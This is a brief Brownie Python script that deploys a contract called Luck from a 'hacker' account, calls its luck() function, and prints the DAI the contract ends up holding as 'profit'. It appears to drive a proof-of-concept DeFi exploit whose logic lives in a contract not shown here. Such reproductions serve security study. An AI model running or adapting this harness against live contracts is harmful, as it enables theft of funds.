from brownie import accounts, interface, Luck

dai = interface.ERC20("0x6B175474E89094C44Da98b954EedeAC495271d0F")

def main():
    hacker = accounts[0]
    l = Luck.deploy({'from': hacker})
    l.luck({'from': hacker})

    print(f'[After] DAI balance (profit) of Luck is: {dai.balanceOf(l) / 1e18}')